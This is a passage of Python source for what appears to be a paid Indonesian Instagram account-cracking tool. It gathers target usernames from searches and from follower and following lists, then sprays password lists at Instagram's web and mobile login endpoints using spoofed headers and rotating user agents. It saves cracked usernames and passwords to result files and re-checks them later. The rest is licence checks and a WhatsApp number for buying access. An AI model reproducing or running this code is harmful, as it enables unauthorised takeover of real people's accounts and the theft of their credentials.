        return "".join(random.choice(chars) for _ in range(size))
          
    def crackerAPI(self,user,pas):
        global loop,success,checkpoint
        ts = calendar.timegm(current_GMT)
        ua=random.choice(baru)
        ses = requests.Session()
        sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
        try:
            try:token = ses.get("https://www.instagram.com/accounts/login/?source=reset_password",headers={"user-agent": ua}).cookies["csrftoken"]
            except (json.decoder.JSONDecodeError,ValueError,KeyError):token = self.generated_csrf_token()
            for pw in pas:
                headers = {
                  "Host": "www.instagram.com",
                    "content-length": "0",
                    "sec-ch-ua": '"Chromium";v="124", "Not(A:Brand";v="99"',
                    "x-ig-www-claim": "hmac.AR1wempl8NtDUxtfJo2Exrxwzw4RgnY75ymbTvyecb-M5RB4",
                    "sec-ch-ua-platform-version": '"12.0.0"',
                    "x-requested-with": "XMLHttpRequest",
                    "dpr": "1.4375",
                    "sec-ch-ua-full-version-list": '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"',
                    "x-csrftoken": token,
                    "sec-ch-ua-model": '"vivo 1915"',
                    "sec-ch-ua-platform": '"Android"',
                    "x-ig-app-id": "1217981644879628",
                    "sec-ch-prefers-color-scheme": "light",
                    "sec-ch-ua-mobile": "?1",
                    "x-instagram-ajax": "1016035497",
                    "user-agent": ua,
                    "viewport-width": "501",
                    "content-type": "application/x-www-form-urlencoded",
                    "accept": "*/*",
                    "x-asbd-id": "129477",
                    "origin": "https://www.instagram.com",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.instagram.com/oauth/oidc/v2?redirect_uri=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Floginpage%2Figoidc%2Fcallback%2Fidtoken%2F&app_id=532380490911317&response_type=code&scope=openid&state=%7B%22user_nonce%22%3A%22ATA49RzWDRydRCyQ3omVT0YiRemKUAUyRQgHerrLPMultUtLeHXlGSYbood3CWfLlFa1csOHxnp_I3Ufeg28Cy3lvXYKcnHP1kcoP7rB%22%2C%22from_ig_login_upsell_sso%22%3Anull%2C%22login_source%22%3A%22fbs_web_landing_page%22%2C%22next%22%3A%22%5Cu00252F%5Cu00253Fnav_ref%5Cu00253Dbizweb_landing_ig_login_button%5Cu002526biz_login_source%5Cu00253Dbizweb_landing_login_ig_oidc_w_pc_login_button%22%2C%22require_professional%22%3Atrue%2C%22create_business_manager%22%3Atrue%7D&logger_id=4dd88fb7-0a40-4b28-9691-35a007c58d98",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                param={
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": "JhonChenXU",
                    'optIntoOneTap':'false','queryParams':json.dumps({"force_authentication":"1","platform_app_id":"532380490911317","next":"/oauth/oidc/?redirect_uri=https://business.facebook.com/business/loginpage/igoidc/callback/idtoken/&app_id=532380490911317&response_type=code&scope=openid&state=%7B%22user_nonce%22:%22ATA49RzWDRydRCyQ3omVT0YiRemKUAUyRQgHerrLPMultUtLeHXlGSYbood3CWfLlFa1csOHxnp_I3Ufeg28Cy3lvXYKcnHP1kcoP7rB%22,%22from_ig_login_upsell_sso%22:null,%22login_source%22:%22fbs_web_landing_page%22,%22next%22:%22%5Cu00252F%5Cu00253Fnav_ref%5Cu00253Dbizweb_landing_ig_login_button%5Cu002526biz_login_source%5Cu00253Dbizweb_landing_login_ig_oidc_w_pc_login_button%22,%22require_professional%22:true,%22create_business_manager%22:true%7D&logger_id=4dd88fb7-0a40-4b28-9691-35a007c58d98","oneTapUsers":"[\"3421292205\"]"}),'trustedDeviceRecords': "{}"}
                respon = ses.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/", headers=headers, data=param, allow_redirects=False)
                babi=json.loads(respon.text)
                if "userId" in str(babi):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                    oi = nel(io, style='green1')
                    print('\n')
                    cetak(nel(oi, title=f'{M2} • {K2} • {H2} • {O2} SUCCESS {day}{H2} • {K2} • {M2} • '))
                    os.system("play-audio data/live.mp3")
                    open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    success.append(user)
                    break
                elif 'href="https://www.instagram.com/challenge/action/"' in str(respon.text):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                    print('\n')
                    oi=nel(io,style='yellow1')
                    cetak(nel(oi, title=f'{M2} • {K2} • {H2} • {O2} CHECKPOINT {day}{H2} • {K2} • {M2} • '))
                    os.system("play-audio data/cp.mp3")
                    open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    checkpoint.append(user)
                    break
                elif 'ip_block' in str(respon.text):
                    sys.stdout.write(f"\r[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
                    self.crackerAPI(user, pas)

                else:
                    continue

            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
            self.crackerAPI(user,pas)
            
    def generateDeviceId(self, seed):
        volatile_seed = "12345"
        m = hashlib.md5()
        m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
        return 'android-' + m.hexdigest()[:16] 

    def generateUUID(self, type):
        generated_uuid = str(uuid.uuid4())
        if (type):
            return generated_uuid
        else:
            return generated_uuid.replace('-', '')
            
    def checkAPI(self,user,pw):
        global loop,success,checkpoint
        jancok_koe = hashlib.md5()
        jancok_koe.update(user.encode('utf-8') + pw.encode('utf-8'))
        device_id = self.generateDeviceId(jancok_koe.hexdigest())
        sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(rey_save_data)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
        try:
            crf_token = self.generated_csrf_token()
            s.headers.update({
                'Connection': 'close',
                'Accept': '*/*',
                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie2': '$Version=1',
                'Accept-Language': 'en-US',
                'User-Agent': self.ua_test(),
            })
            self.data = json.dumps({
                'phone_id': self.generateUUID(True),
                '_csrftoken': crf_token,
                'username': user,
                'guid': self.generateUUID(True),
                'device_id': device_id,
                'password': pw,
                'login_attempt_count': '0'})
            self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
                self.generateUUID(False),
                urllib.request.quote(self.data)
            )
            x=s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
            x_jason=json.loads(x.text)
            if "logged_in_user" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='green1 ')
                print('\n')
                cetak(nel(oi, title='SUCCESS DETECTOR '))
                open(f"result/successdetector-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                success.append(user)

            elif 'checkpoint_url' in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='yellow1')
                print('\n')
                cetak(nel(oi, title=' CHECKPOINT DETECTOR'))
                open(f"result/checkpointdetector-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                checkpoint.append(user)
            else:pass
            loop+=1
        except requests.exceptions.ConnectionError:time.sleep(5);loop-=1;self.checkAPI(user,pw)
        except Exception as e:self.checkAPI(user,pw)

    def menu(self):
        self.logo()
        c=input(f'{P}[{B}?{P}] menu : {H}')
        if c=='':
            self.menu()
        elif c in ('1','01'):
            m=int(input(f'{P}[{B}?{P}] masukan jumlah target : {H}'))
            prints(Panel(f"{P2}masukan nama random untuk di searching, {H2}1 {P2}nama setara dengan {H2}5000 {P2}username",width=80,padding=(0,1),style=f"#FFFFFF"))
            for i in range(m):
                i+1
                i+=1
                nama=input(f'{P}[{B}?{P}] masukan nama {B}{len(internal)}{P} : {H}')
                name=self.searchAPI(self.cookie,nama)
            self.passwordAPI(name)

        elif c in ('2','02'):
            massal(self)
        elif c in ('3','03'):
            meng(self)
        elif c in ('4','04'):
            prints(Panel(f"{P2}tunggu sebentar sedang mengecek file hasil result anda",width=80,padding=(0,9),style=f"#FFFFFF"))
            time.sleep(2)
            for i in os.listdir('result'):
                jalan(f'{P}[{B}+{P}] {i}')
            c=input(f'{P}[{B}?{P}] masukan nama file : {H}')
            for z in open("result/%s"%(c)).read().splitlines():
                rey_save_data.append(z)
                print(z)
            prints(Panel(f"{P2}sedang mengecek status akun harap tunggu sebentar",width=80,padding=(0,12),style=f"#FFFFFF"))
            for s in rey_save_data:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                self.checkAPI(usr,pwd)
            jalan(f"{P}[{H}✓{P}] proses check akun selesai...")
            exit()

        elif c in ('5','05'):
            prints(Panel(f"{P2}tunggu sebentar sedang mengecek file hasil result anda",width=80,padding=(0,9),style=f"#FFFFFF"))
            time.sleep(2)
            for i in os.listdir('result'):
                jalan(f'{P}[{B}+{P}] {i}')
            c=input(f'{P}[{B}?{P}] masukan nama file : {H}')
            g=open("result/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            jalan(f'\n{P}[{B}?{P}] total result di temukan : {H}{len(g)}{P}')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="checkpoint":
                    print(f"""
  ├──[ HASIL {M}CHECKPOINT ]
  ├──[{K}CP{C}] Username  :{K} {usr}{C}
  ├──[{K}CP{C}] Password  :{K} {pwd}{C}
  ├──[{K}CP{C}] Followers :{K} {fol}{C}
  ├──[{K}CP{C}] Following :{K} {ful}{C}
                    """);sleep(0.05);sleep(0.05)
                else:
                    print(f"""
  ├──[ HASIL {H}OK ]
  ├──[{H}OK{C}] Username  :{H} {usr}{C}
  ├──[{H}OK{C}] Password  :{H} {pwd}{C}
  ├──[{H}OK{C}] Pengikut  :{H} {fol}{C}
  ├──[{H}OK{C}] Mengikuti :{H} {ful}{C}
                    """);sleep(0.05)
        elif c in ('6','06'):
            print(f'{P}[{M}!{P}] bot auto unfollow sedang dalam proses maintenance')
            time.sleep(2)
            self.menu()

        elif c in ('7','07'):
            self.HapusLisen()
            
        elif c in ('0','00'):
            self.Exit()

        else:
            self.menu()
def tlisensi():
    banner()
    nt='[bright_white][+] This Tool Paid\n[+] WhatsApp me if you want to buy a license\n[+] +6285965855784\n[+] You shall not misuse the information to gain unauthorised access.\n[+] I will not be Responsible for Anything, Use at Your Own Risk..⚠️\n[+] Use it properly..⚠️\n'
    nt2 =nel(nt, style='purple   ')
    cetak(nel(nt2, title='NOTE⚠️'))
    time.sleep(1)
    lisen=input('[•] Masukankan License: ')
    open('.lisen.txt','w').write(lisen)
    lisensi()
    
def lisensi():
    try:
        cek=open('.lisen.txt').read()
        lisensikuni.append(cek)
    except:
        tlisensi()
    ses=requests.Session()
    res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyI1NTc5MDEyMyIsIkxGR3BCRUlXdzhIeUNvWWl0NUg0QitMQ3Nsdy9FUVNoaVJiZDhBczUiXQ==&ProductId=21135&Key='+lisensikuni[0]).json()
    status=res['licenseKey']['key']
    if status ==cek:
        banner()
        wel='# LISENSI BENAR '
        wel2 = mark(wel, style='bold green')
        sol().print(wel2)
        time.sleep(1)
        lisensiku.append("sukses")
        login_kamu()
    else:
        tlisensi()


def meng(self):
        menudump.append('mengikuti')
        prints(Panel(f"{P2}PASTIKAN USERNAME YANG ANDA AMBIL BERSIFAT PUBLIC,BUKAN AKUN PRIVAT ",width=80,style='purple '))
        nama=input(f'{P}[{B}?{P}] masukan username :{H} ')
        id=self.idAPI(self.cookie,nama)
        info=self.Api_Dump_Sora_Following(self.cookie,id)
        self.passwordAPI(info)

def massal(self):
            menudump.append('pengikut')
            prints(Panel(f"{P2}PASTIKAN USERNAME YANG ANDA AMBIL BERSIFAT PUBLIC,BUKAN AKUN PRIVAT ",width=80,style='purple '))
            m=input(f'{P}[{B}?{P}] masukan username:{H} ')
            id=self.idAPI(self.cookie,m)
            info=self.Api_Dump_Sora_Followers(self.cookie,id)
            self.passwordAPI(info)



###----------[ CEK LISENSI ]---------- ###
def cek():
    try:x=open("data/lisensi.txt","r").read()
    except FileNotFoundError:key()
    try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyI1NTc5MDEyMyIsIkxGR3BCRUlXdzhIeUNvWWl0NUg0QitMQ3Nsdy9FUVNoaVJiZDhBczUiXQ==&ProductId=21135&Key=%s"%(x)).json()['licenseKey']['key'];login_kamu()
    except KeyError:
        prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285965855784?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagramnya");time.sleep(2);exit()

###----------[ MASUK LISENSI ]---------- ###
def key():
    os.system("clear") 
    banner()
    prints(Panel(f"{P2}Silahkan Masukan Lisensi,Agar Bisa Masuk Ke Tools \njika anda belum mempunyai lisensi ketik {H2}beli {P2}untuk melihat harga lisensi"))
    key = input(f" {K}🔥{P} Silahkan Masukkan Lisensi : {H}")
    if key in ["beli","Beli","BELI"]:beli_bang()
    try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyI1NTc5MDEyMyIsIkxGR3BCRUlXdzhIeUNvWWl0NUg0QitMQ3Nsdy9FUVNoaVJiZDhBczUiXQ==&ProductId=21135&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi yang anda masukan terdaftar",width=80,padding=(0,6),style=f"{color_table}"));time.sleep(4);login_kamu()
    except KeyError:
        prints(Panel(f"{P2} lisensi yang anda masukan tidak terdaftar silahkan beli terlebih dahulu",width=80,padding=(0,1),style=f"{color_table}"));os.system("xdg-open https://wa.me/+6285965855784?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagramnya");time.sleep(2);exit()

###----------[ BUY LISENSI ]---------- ###    
def beli_bang():
    prints(Panel(f"{P2}[{color_rich}1{P2}]. lisensi 1 bulan 100k\n{P2}[{color_rich}2{P2}]. lisensi 2 bulan 200k\n{P2}[{color_rich}3{P2}]. lisensi permanen 350k\n{P2}{color_rich}{P2}[{color_rich}4{P2}]. kembali ( {H2}tools{P2} )",width=39,padding=(0,2),style=f"#FFFFFF"))
    zxc = input(f" {H}• {P}pilih lisensi : ")
    if zxc in [""]:print(f" {K}• {P}pilih yang bener broo jangan kosong !");time.sleep(3);cek_lisensi_aktif()
    elif zxc in ["1","01"]:os.system("xdg-open https://wa.me/+6285965855784?text=assalamualaikum+bang+mau+beli+lisensi+1+bulan");time.sleep(2);exit()
    elif zxc in ["2","02"]:os.system("xdg-open https://wa.me/+6285965855784?text=assalamualaikum+bang+mau+beli+lisensi+2+bulan");time.sleep(2);exit()
    elif zxc in ["3","03"]:os.system("xdg-open https://wa.me/+6285965855784?text=assalamualaikum+bang+mau+beli+lisensi+permanen");time.sleep(2);exit()
    elif zxc in ["4","04"]:time.sleep(1);cek_lisensi_aktif()
    else:print(f" {K}• {P}ngetik yang bener bang ?");time.sleep(3);cek_lisensi_aktif()

###----------[ CEK LISENSI AKTIF ]---------- ###
def cek_lisensi_aktif():
    try:xz = open("data/lisensi.txt","r").read()
    except FileNotFoundError:key()
    os.system("clear");cek()

if __name__=='__main__':
	lisensiku.append("sukses")
	try:
	    with requests.Session() as sor:
	         ki = sor.get('https://pastebin.com/raw/nwZAUhtG').json()
	         SORA.update(ki)
	         ko = sor.get('https://raw.githubusercontent.com/Ganz138themax/gassken/main/ua').json()
	         SORA1.update(ko)
	         login_kamu()
	except requests.exceptions.ConnectionError:
		print(f'{P}[{M}!{P}] koneksi internet anda bermasalah');exit()

